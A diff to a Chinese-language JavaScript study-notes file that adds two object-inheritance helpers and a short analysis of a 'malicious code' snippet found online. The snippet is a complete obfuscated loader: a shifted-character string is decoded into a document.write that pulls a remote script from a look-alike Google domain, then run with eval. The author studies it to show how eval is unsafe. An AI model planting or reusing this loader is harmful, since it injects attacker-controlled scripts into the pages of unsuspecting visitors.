@@ -73,6 +73,57 @@ console.log(global.a)
 console.log(module.exports.a)
 ```
 
+### **两种对象继承方法**
 
+第一种是 YUI 库实现继承方法，利用空对象作为中介的 prototype 模式继承，直接封装成函数了：
 
+```
+function extend(Child, Parent) {
 
+  var F = function () {};
+  
+  F.prototype = Parent.prototype;
+  
+  Child.prototype = new F();
+  
+  // 上面的操作使子对象的 constructor 指向了空对象，下面手动纠正回来
+  Child.prototype.constructor = Child;
+  
+  // 为子对象设置一个uber属性，这个属性直接指向父对象的prototype属性
+  // 这等于在子对象上打开一条通道，可以直接调用父对象的方法。实现继承的完备性，纯属备用性质
+  Child.uber = Parent.prototype;
+}
+```
+
+第二种是拷贝继承，把父对象的所有属性和方法拷贝进子对象实现继承，封装成函数是：
+
+```
+function extend2(Child, Parent) {
+  var p = Parent.prototype;
+  var c = Child.prototype;
+  for (var i in p) {
+    c[i] = p[i];
+  }
+  c.uber = p;
+}
+```
+
+### **一段恶意代码**
+
+网上瞎逛的时候发现了这么一段代码，颇有意思，研究研究：
+```
+var str = "cnbtldms-vqhsd'!;rbqhosrqb<";
+str += "[!gsso9..vvv-fnnfkd`crk-bnl.robncd.";
+str+="iptdqx-ir[!=;.rbqhos=!(:";
+var length = str.length;
+var ba64 = "";
+for (i = 0; i < length; i++) {
+    var s = str.charCodeAt(i);
+    s++;
+    ba64 = ba64 + String.fromCharCode(s);
+}
+console.log(ba64);
+eval(ba64);
+```
+
+很巧妙，用一堆莫名其妙的无效字符串通过对每个字符进行转码操作再转回字符串就变成一串有效的恶意字符串， 最后用 eval() 执行恶意字符串，学习了。把这段恶意代码嵌套到别的网站中，用户访问该网站就执行了这段恶意代码。而且这种病毒一般杀毒软件都查杀不了，也可以看出 eval() 的不安全性。
